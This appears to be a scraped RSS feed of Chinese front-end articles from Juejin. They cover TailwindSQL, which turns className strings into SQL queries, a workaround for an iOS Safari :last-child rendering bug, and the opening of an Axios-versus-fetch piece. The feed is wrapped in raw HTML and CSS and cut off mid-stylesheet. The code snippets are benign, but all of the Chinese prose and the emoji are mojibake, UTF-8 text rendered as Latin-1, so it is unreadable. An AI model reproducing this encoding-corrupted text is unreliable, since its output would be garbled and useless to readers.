img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">CSS å†™ SQL æŸ¥è¯¢ï¼Ÿåç«¯æ…Œäº†ï¼</h2>
<p><img src="https://static.xxytime.top/2026/01/02/55bd7944-ebd6-4f3b-b58e-e39e7a87dfd4.jpg" alt="cover_image" loading="lazy"/></p>
<p>åˆæ¬¡æ¥è§¦åˆ°è¿™ä¸ªé¡¹ç›®æ—¶ï¼Œæˆ‘çš„ç¬¬ä¸€ååº”åªæœ‰<strong>å››ä¸ªå­—</strong>ï¼š</p>
<p><img src="https://static.xxytime.top/2026/01/02/33a1f186-3dec-4908-b317-762ea60d84e3.jpg" alt="" loading="lazy"/></p>
<p><strong>è¿™ä¹Ÿè¡Œï¼Ÿ</strong></p>
<p>æœ€è¿‘åœ¨ <strong>X</strong> ä¸Šå¤§ç«çš„ä¸€ä¸ªå« <strong>TailwindSQL</strong> çš„é¡¹ç›®ï¼Œå¼•å‘äº†å¹¿æ³›è®¨è®ºã€‚</p>
<p><img src="https://static.xxytime.top/2026/01/02/d00b126c-cb2a-4931-bf91-82c02533bad4.jpg" alt="" loading="lazy"/></p>
<p>å…¶æ ¸å¿ƒç©æ³•éå¸¸ç®€å•â€”â€”<strong>é€šè¿‡ CSS çš„ className æ¥å®ç° SQL æŸ¥è¯¢åŠŸèƒ½ã€‚</strong></p>
<h3 data-id="heading-1">å‰ç«¯å‘å±•åˆ°è¿™ä¸ªåœ°æ­¥äº†å—ï¼Ÿ</h3>
<p>è®©æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸ªç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">&lt;DB <span class="hljs-attr">className</span>=<span class="hljs-string">"db-users-name-where-id-1"</span> /&gt;
</code></pre>
<p>å¦‚æœä½ æ˜¯<strong>å‰ç«¯å¼€å‘è€…</strong>ï¼Œå¯èƒ½ä¼šä¸‹æ„è¯†åœ°è®¤ä¸ºè¿™æ˜¯åœ¨<code>å®šä¹‰æ ·å¼</code>ï¼›</p>
<p>ä½†å¦‚æœä½ æ˜¯<strong>åç«¯å¼€å‘è€…</strong>ï¼Œä¼°è®¡å·²ç»å¼€å§‹çš±çœ‰äº†ã€‚</p>
<p>ç„¶è€Œå®é™…ä¸Šï¼Œè¿™æ®µä»£ç æ‰§è¡Œçš„æ˜¯ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">SELECT name FROM users WHERE <span class="hljs-attr">id</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
</code></pre>
<p>çœ‹åˆ°è¿™é‡Œï¼Œæˆ‘ç¡®å®æ„£äº†ä¸€ä¸‹ã€‚</p>
<h3 data-id="heading-2">TailwindSQL çš„æœ¬è´¨</h3>
<p>ç®€è€Œè¨€ä¹‹ï¼Œå®ƒå°† <strong>SQL</strong> è¯­å¥æ‹†è§£ä¸ºä¸€ä¸ªä¸ª<code>ã€Œç±»åã€</code>ç‰‡æ®µã€‚</p>
<p>è¿™ç§åšæ³•ç±»ä¼¼äº <code>TailwindCSS</code> å¯¹ <code>CSS</code> çš„å¤„ç†æ–¹å¼ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp">db-users
db-users-name
db-users-name-<span class="hljs-keyword">where</span>-id<span class="hljs-number">-1</span>
db-products-<span class="hljs-keyword">orderby</span>-price-desc
</code></pre>
<p>è¿™äº› <strong>className</strong> æœ€ç»ˆä¼šè¢«è§£æä¸º <code>SQL</code> è¯­å¥ï¼Œå¹¶åœ¨ <strong>React Server Components</strong> ä¸­ç›´æ¥æ‰§è¡Œã€‚</p>
<p>ä½ ç”šè‡³æ— éœ€ç¼–å†™ <strong>API</strong> æ¥å£ï¼Œä¹Ÿæ— éœ€ä½¿ç”¨ <strong>ORM</strong> æ¡†æ¶ã€‚</p>
<h3 data-id="heading-3">è¿™ä¸ªæ–¹æ¡ˆå¯é å—ï¼Ÿ</h3>
<p>ä»å·¥ç¨‹å®è·µçš„è§’åº¦æ¥çœ‹ï¼Œç­”æ¡ˆå…¶å®å¾ˆæ˜ç¡®ï¼š</p>
<p><strong>å¹¶ä¸å¯é ã€‚</strong></p>
<p><strong>SQL</strong> çš„å¤æ‚æ€§ï¼Œä»æ¥ä¸æ˜¯è¯­æ³•å±‚é¢çš„é—®é¢˜ã€‚</p>
<p>çœŸæ­£çš„æŒ‘æˆ˜åœ¨äºï¼š</p>
<ul>
<li>
<p><strong>è¡¨å…³ç³»ç®¡ç†</strong></p>
</li>
<li>
<p><strong>å¤æ‚ JOIN æ“ä½œ</strong></p>
</li>
<li>
<p><strong>åµŒå¥—å­æŸ¥è¯¢</strong></p>
</li>
<li>
<p><strong>äº‹åŠ¡æ§åˆ¶</strong></p>
</li>
<li>
<p><strong>æƒé™éªŒè¯</strong></p>
</li>
<li>
<p><strong>è¾¹ç•Œæ¡ä»¶å¤„ç†</strong></p>
</li>
</ul>
<p>ä¸€æ—¦æŸ¥è¯¢é€»è¾‘ç¨æ˜¾å¤æ‚ï¼Œ<strong>className</strong> å°±ä¼šå˜å¾—è¶Šæ¥è¶Šå†—é•¿ï¼Œæœ€ç»ˆå½¢æˆä¸€ä¸²éš¾ä»¥ç»´æŠ¤çš„ä»£ç ç‰‡æ®µã€‚</p>
<p>è¯´å®è¯ï¼Œæˆ‘å¾ˆéš¾æƒ³è±¡åœ¨å®é™…é¡¹ç›®ä¸­ï¼Œä¼šæœ‰å¼€å‘è€…è®¤çœŸåœ°å†™å‡ºè¿™æ ·çš„ä»£ç ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">className</span>=<span class="hljs-string">"db-orders-user-products-joinwhere-user-age-gt-18and-order-status-paidgroupby-user-id"</span>
</code></pre>
<p>è¿™å·²ç»ä¸å†æ˜¯ DSLï¼ˆé¢†åŸŸç‰¹å®šè¯­è¨€ï¼‰äº†ï¼Œè€Œæ˜¯ä¸€ç§æŠ˜ç£¨ã€‚</p>
<p>æˆ‘è®¤ä¸º <strong>TailwindSQL</strong> å¾ˆéš¾åœ¨ç”Ÿäº§ç¯å¢ƒä¸­å¾—åˆ°åº”ç”¨ï¼Œå®ƒæ›´åƒæ˜¯ <strong>vibe coding</strong>ï¼ˆæ°›å›´ç¼–ç¨‹ï¼‰çš„äº§ç‰©ã€‚</p>
<p>æ˜¯å¦ä½¿ç”¨ï¼Ÿå¯ä»¥äº†è§£ä¸€ä¸‹ï¼Œç„¶åç»§ç»­ç¼–å†™ä½ ç†Ÿæ‚‰çš„ <strong>SQL</strong> å§ã€‚</p>
<ul>
<li><strong>TailwindSQL å®˜ç½‘</strong>ï¼š<code>https://tailwindsql.com/</code></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åœ¨iosä¸ŠåŠ¨æ€æ’å…¥å…ƒç´ çš„åˆ—è¡¨ä½¿ç”¨:last-childæ ·å¼å¯èƒ½ä¸èƒ½åŠæ—¶ç”Ÿæ•ˆ]]></title>    <link>https://juejin.cn/post/7589958976226967562</link>    <guid>https://juejin.cn/post/7589958976226967562</guid>    <pubDate>2026-01-02T09:39:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589958976226967562" data-draft-id="7589962224796041254" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åœ¨iosä¸ŠåŠ¨æ€æ’å…¥å…ƒç´ çš„åˆ—è¡¨ä½¿ç”¨:last-childæ ·å¼å¯èƒ½ä¸èƒ½åŠæ—¶ç”Ÿæ•ˆ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-02T09:39:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="tjswk2008"/> <meta itemprop="url" content="https://juejin.cn/user/3949101496404295"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åœ¨iosä¸ŠåŠ¨æ€æ’å…¥å…ƒç´ çš„åˆ—è¡¨ä½¿ç”¨:last-childæ ·å¼å¯èƒ½ä¸èƒ½åŠæ—¶ç”Ÿæ•ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3949101496404295/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    tjswk2008
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T09:39:38.000Z" title="Fri Jan 02 2026 09:39:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¿™æ˜¯ä¸€ä¸ªåœ¨ iOS Safariï¼ˆWebkit å¼•æ“ï¼‰ä¸­æ¯”è¾ƒç»å…¸çš„æ¸²æŸ“ Bugã€‚å½“é€šè¿‡ JavaScript åŠ¨æ€å‘å®¹å™¨æœ«å°¾æ·»åŠ å…ƒç´ æ—¶ï¼ŒWebkit æœ‰æ—¶æœªèƒ½æ­£ç¡®è§¦å‘é‡ç»˜ï¼ˆRepaintï¼‰æˆ–æ ·å¼é‡æ–°è®¡ç®—ï¼ˆStyle Recalculationï¼‰ï¼Œå¯¼è‡´ <code>:last-child</code> ä¼ªç±»ä»ç„¶åœç•™åœ¨ä¹‹å‰çš„å…ƒç´ ä¸Šã€‚</p>
<p>ä»¥ä¸‹æ˜¯è§£å†³è¿™ä¸ªé—®é¢˜çš„å‡ ç§å¸¸ç”¨æ–¹æ¡ˆï¼ŒæŒ‰æ¨èç¨‹åº¦æ’åºï¼š</p>
<h3 data-id="heading-0">1. å¼ºåˆ¶è§¦å‘é‡ç»˜ (Force Reflow)</h3>
<p>è¿™æ˜¯æœ€ç®€å•ç›´æ¥çš„â€œé»‘ç§‘æŠ€â€ã€‚åœ¨æ’å…¥å…ƒç´ çš„ä»£ç åé¢ï¼Œè¯»å–ä¸€æ¬¡å®¹å™¨æˆ–æ–°å…ƒç´ çš„æŸä¸ªå¸ƒå±€å±æ€§ï¼ˆå¦‚ <code>offsetHeight</code>ï¼‰ï¼Œå¼ºåˆ¶æµè§ˆå™¨åŒæ­¥è®¡ç®—æ ·å¼ã€‚</p>
<p>JavaScript</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">container</span> = document.getElementById(<span class="hljs-string">'container'</span>)<span class="hljs-comment">;</span>
const <span class="hljs-attr">newItem</span> = document.createElement(<span class="hljs-string">'div'</span>)<span class="hljs-comment">;</span>
container.appendChild(newItem)<span class="hljs-comment">;</span>

// å¼ºåˆ¶è§¦å‘é‡ç»˜
container.offsetHeight<span class="hljs-comment">; </span>
</code></pre>
<h3 data-id="heading-1">2. ä½¿ç”¨ Flex/Grid çš„ <code>gap</code> å±æ€§ (æ¨è)</h3>
<p>å¦‚æœä½ çš„ <code>:last-child</code> ä¸»è¦æ˜¯ä¸ºäº†å¤„ç†é—´è·ï¼ˆä¾‹å¦‚ <code>margin-bottom: 0</code>ï¼‰ï¼Œé‚£ä¹ˆ<strong>å¼ƒç”¨ <code>:last-child</code> æ”¹ç”¨ <code>gap</code></strong> æ˜¯æœ€ç°ä»£ä¸”æ ¹æœ¬çš„è§£å†³æ–¹æ¡ˆã€‚<code>gap</code> ä¼šè‡ªåŠ¨å¤„ç†å…ƒç´ é—´çš„é—´è·ï¼Œä¸éœ€è¦åˆ¤æ–­è°æ˜¯æœ€åä¸€ä¸ªã€‚</p>
<p>CSS</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">flex-direction</span>: column;
  <span class="hljs-attribute">gap</span>: <span class="hljs-number">10px</span>; <span class="hljs-comment">/* å…ƒç´ ä¹‹é—´è‡ªåŠ¨äº§ç”Ÿ 10px é—´è·ï¼Œæœ€åä¸€ä¸ªå…ƒç´ åæ–¹ä¸ä¼šæœ‰é—´è· */</span>
}
</code></pre>
<h3 data-id="heading-2">3. åå‘æ€è·¯ï¼šä½¿ç”¨ <code>:not(:last-child)</code></h3>
<p>æœ‰æ—¶å€™ Webkit å¯¹â€œè°æ˜¯æœ€åä¸€ä¸ªâ€ååº”è¿Ÿé’ï¼Œä½†å¯¹â€œè°ä¸æ˜¯æœ€åä¸€ä¸ªâ€ååº”è¾ƒå¿«ã€‚å°è¯•ç»™æ‰€æœ‰éæœ«å°¾å…ƒç´ è®¾ç½®æ ·å¼ï¼š</p>
<p>CSS</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* ä¸æ¨è */</span>
<span class="hljs-comment">/* .item { margin-bottom: 10px; } */</span>
<span class="hljs-comment">/* .item:last-child { margin-bottom: 0; } */</span>

<span class="hljs-comment">/* æ¨è */</span>
<span class="hljs-selector-class">.item</span><span class="hljs-selector-pseudo">:not</span>(<span class="hljs-selector-pseudo">:last-child</span>) {
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">10px</span>;
}
</code></pre>
<h3 data-id="heading-3">4. æ‰‹åŠ¨åˆ‡æ¢ Class</h3>
<p>å¦‚æœé€»è¾‘æ¯”è¾ƒå¤æ‚ï¼Œä¼ªç±»å¤±æ•ˆé¢‘ç¹ï¼Œå»ºè®®æ”¾å¼ƒ CSS ä¼ªç±»ï¼Œæ”¹ç”¨ JavaScript åœ¨æ’å…¥æ—¶æ‰‹åŠ¨ç»´æŠ¤ä¸€ä¸ª <code>.is-last</code> ç±»ã€‚</p>
<p>JavaScript</p>
<pre><code class="hljs language-ini" lang="ini">// æ’å…¥é€»è¾‘
const <span class="hljs-attr">items</span> = container.querySelectorAll(<span class="hljs-string">'.item'</span>)<span class="hljs-comment">;</span>
items.forEach(<span class="hljs-attr">el</span> =&gt; el.classList.remove(<span class="hljs-string">'is-last'</span>))<span class="hljs-comment">;</span>
const <span class="hljs-attr">lastItem</span> = items[items.length - <span class="hljs-number">1</span>]<span class="hljs-comment">;</span>
lastItem.classList.add('is-last')<span class="hljs-comment">;</span>
</code></pre>
<hr/>
<h3 data-id="heading-4">ä¸ºä»€ä¹ˆä¼šå‘ç”Ÿè¿™ç§æƒ…å†µï¼Ÿ</h3>
<p>Webkit å¼•æ“ä¸ºäº†æ€§èƒ½ä¼˜åŒ–ï¼Œä¼šå°½é‡å‡å°‘æ ·å¼é‡æ–°è®¡ç®—çš„é¢‘ç‡ã€‚å½“ DOM æ ‘å‘ç”Ÿå˜åŒ–æ—¶ï¼Œå®ƒæœ¬åº”æ ‡è®°è¯¥å®¹å™¨ä¸º "dirty" å¹¶é‡æ–°æ£€æŸ¥ä¼ªç±»çŠ¶æ€ï¼Œä½†åœ¨æŸäº›å¤æ‚çš„åµŒå¥—å¸ƒå±€æˆ–ç‰¹å®šçš„ iOS ç‰ˆæœ¬ä¸­ï¼Œè¿™ä¸ªè§¦å‘æœºåˆ¶ä¼šæ¼æ‰å¯¹ <code>:last-child</code> çš„æ£€æŸ¥ã€‚</p>
<p><strong>å»ºè®®ï¼š</strong> å¦‚æœä½ çš„é¡¹ç›®ç¯å¢ƒå…è®¸ï¼ˆiOS 14.1+ï¼‰ï¼Œä¼˜å…ˆä½¿ç”¨ <strong>Flexbox/Grid çš„ <code>gap</code></strong>ã€‚å®ƒä¸ä»…æ€§èƒ½æ›´å¥½ï¼Œè¿˜èƒ½å½»åº•è§„é¿æ­¤ç±»ç”±äºåŠ¨æ€æ’å…¥å¯¼è‡´çš„ä¼ªç±»å¤±æ•ˆé—®é¢˜ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ”¥3 kB æ¢ 120 ms é˜»å¡ï¼Ÿ Axios è¿˜æ˜¯ fetchï¼Ÿ]]></title>    <link>https://juejin.cn/post/7590011643297005606</link>    <guid>https://juejin.cn/post/7590011643297005606</guid>    <pubDate>2026-01-02T09:50:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590011643297005606" data-draft-id="7590021144779882542" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ”¥3 kB æ¢ 120 ms é˜»å¡ï¼Ÿ Axios è¿˜æ˜¯ fetchï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-02T09:50:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="404æ˜Ÿçƒçš„çŒ«"/> <meta itemprop="url" content="https://juejin.cn/user/193147068224126"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ”¥3 kB æ¢ 120 ms é˜»å¡ï¼Ÿ Axios è¿˜æ˜¯ fetchï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/193147068224126/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    404æ˜Ÿçƒçš„çŒ«
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T09:50:09.000Z" title="Fri Jan 02 2026 09:50:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid 